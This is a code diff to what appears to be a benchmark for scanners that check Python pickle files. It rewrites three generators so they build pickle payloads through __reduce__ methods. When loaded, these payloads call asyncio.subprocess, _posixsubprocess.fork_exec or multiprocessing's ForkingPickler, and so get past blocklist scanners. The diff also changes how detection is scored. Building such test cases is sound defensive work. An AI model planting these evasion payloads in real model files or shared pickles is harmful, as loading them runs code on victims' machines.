@@ -427,19 +427,15 @@ class JFrogZeroDayGenerator:
     def create_asyncio_bypass(path: Path) -> dict:
         """CVE-2025-10157: Unsafe globals using asyncio subclasses."""
         # asyncio.subprocess is often not in blacklists
-        pickle_data = (
-            b"\x80\x04"  # Protocol 4
-            b"\x95\x40\x00\x00\x00\x00\x00\x00\x00"  # Frame
-            b"\x8c\x11asyncio.subprocess"  # Module (often missed)
-            b"\x8c\x14create_subprocess_exec"  # Function
-            b"\x93"  # STACK_GLOBAL
-            b"\x8c\x02sh"  # Argument
-            b"\x85"  # TUPLE1
-            b"\x52"  # REDUCE
-            b"."  # STOP
-        )
+
+        class AsyncioBypass:
+            def __reduce__(self):
+                import asyncio.subprocess
+
+                return (asyncio.subprocess.create_subprocess_exec, ("sh",))
+
         with open(path, "wb") as f:
-            f.write(pickle_data)
+            pickle.dump(AsyncioBypass(), f)
 
         return {
             "name": "asyncio_subprocess_bypass",
@@ -454,18 +450,15 @@ class JFrogZeroDayGenerator:
     def create_internal_module_bypass(path: Path) -> dict:
         """CVE-2025-10157: Using internal module references."""
         # _posixsubprocess is the internal module used by subprocess
-        pickle_data = (
-            b"\x80\x04"  # Protocol 4
-            b"\x95\x35\x00\x00\x00\x00\x00\x00\x00"  # Frame
-            b"\x8c\x10_posixsubprocess"  # Internal module
-            b"\x8c\x09fork_exec"  # Function
-            b"\x93"  # STACK_GLOBAL
-            b")"  # Empty tuple
-            b"\x81"  # NEWOBJ
-            b"."  # STOP
-        )
+
+        class InternalBypass:
+            def __reduce__(self):
+                import _posixsubprocess
+
+                return (_posixsubprocess.fork_exec, ([], [], True, (), None, None, -1, -1, -1, -1, -1, -1, 0, False, False, False, None, None, None, -1, None, False))
+
         with open(path, "wb") as f:
-            f.write(pickle_data)
+            pickle.dump(InternalBypass(), f)
 
         return {
             "name": "internal_module_bypass",
@@ -479,18 +472,15 @@ class JFrogZeroDayGenerator:
     @staticmethod
     def create_multiprocessing_bypass(path: Path) -> dict:
         """CVE-2025-10157: multiprocessing.reduction bypass."""
-        pickle_data = (
-            b"\x80\x04"  # Protocol 4
-            b"\x95\x38\x00\x00\x00\x00\x00\x00\x00"  # Frame
-            b"\x8c\x17multiprocessing.reduction"  # Module
-            b"\x8c\x06ForkingPickler"  # Class (can execute code)
-            b"\x93"  # STACK_GLOBAL
-            b")"  # Empty tuple
-            b"\x81"  # NEWOBJ
-            b"."  # STOP
-        )
+
+        class MultiprocessingBypass:
+            def __reduce__(self):
+                import multiprocessing.reduction
+
+                return (multiprocessing.reduction.ForkingPickler, (None,))
+
         with open(path, "wb") as f:
-            f.write(pickle_data)
+            pickle.dump(MultiprocessingBypass(), f)
 
         return {
             "name": "multiprocessing_bypass",
@@ -1455,10 +1445,9 @@ class BenchmarkRunner:
                 timeout=60,
             )
 
-            output = result.stdout.lower()
-            detected = any(
-                level in output for level in ["critical", "high", "medium"]
-            )
+            # Detection is based on exit code: 0 = safe, non-zero = threats detected
+            # Only CRITICAL and HIGH findings trigger non-zero exit code
+            detected = result.returncode != 0
 
             return {
                 "detected": detected,
